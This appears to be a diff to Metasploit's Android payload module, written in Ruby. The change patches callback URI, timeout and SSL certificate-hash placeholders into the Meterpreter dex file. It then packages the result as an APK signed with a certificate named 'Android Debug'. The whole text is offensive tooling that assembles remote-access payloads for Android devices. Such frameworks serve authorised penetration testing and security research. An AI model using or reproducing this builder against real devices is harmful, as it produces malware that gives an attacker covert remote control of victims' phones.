@@ -36,7 +36,7 @@ module Msf::Payload::Android
     [str.length].pack("N") + str
   end
 
-  def apply_options(classes, opts, url)
+  def apply_options(classes, opts)
     timeouts = [
       datastore['SessionExpirationTimeout'].to_s,
       datastore['SessionCommunicationTimeout'].to_s,
@@ -47,7 +47,15 @@ module Msf::Payload::Android
       config = generate_config_hex(opts)
       string_sub(classes, 'UUUU' + ' ' * 8191, 'UUUU' + config)
     end
-    string_sub(classes, 'ZZZZ' + ' ' * 512, 'ZZZZ' + url)
+    if opts[:ssl]
+      verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
+                                           datastore['HandlerSSLCert'])
+      if verify_cert_hash
+        hash = 'WWWW' + verify_cert_hash.unpack("H*").first
+        string_sub(classes, 'WWWW                                        ', hash)
+      end
+    end
+    string_sub(classes, 'ZZZZ' + ' ' * 512, 'ZZZZ' + payload_uri)
     string_sub(classes, 'TTTT' + ' ' * 48, 'TTTT' + timeouts)
   end
 
@@ -70,11 +78,11 @@ module Msf::Payload::Android
     data.gsub!(placeholder, input + ' ' * (placeholder.length - input.length))
   end
 
-  def generate_cert
+  def sign_jar(jar)
     x509_name = OpenSSL::X509::Name.parse(
-      "C=Unknown/ST=Unknown/L=Unknown/O=Unknown/OU=Unknown/CN=Unknown"
-      )
-    key  = OpenSSL::PKey::RSA.new(1024)
+      "C=US/O=Android/CN=Android Debug"
+    )
+    key  = OpenSSL::PKey::RSA.new(2048)
     cert = OpenSSL::X509::Certificate.new
     cert.version = 2
     cert.serial = 1
@@ -99,7 +107,32 @@ module Msf::Payload::Android
     # If this line is left out, signature verification fails on OSX.
     cert.sign(key, OpenSSL::Digest::SHA1.new)
 
-    return cert, key
+    jar.sign(key, cert, [cert])
   end
+
+  def generate_jar(opts={})
+    if opts[:stageless]
+      classes = MetasploitPayloads.read('android', 'meterpreter.dex')
+    else
+      classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
+    end
+
+    apply_options(classes, opts)
+
+    jar = Rex::Zip::Jar.new
+    files = [
+      [ "AndroidManifest.xml" ],
+      [ "resources.arsc" ]
+    ]
+    jar.add_files(files, MetasploitPayloads.path("android", "apk"))
+    jar.add_file("classes.dex", fix_dex_header(classes))
+    jar.build_manifest
+
+    sign_jar(jar)
+
+    jar
+  end
+
+
 end
 
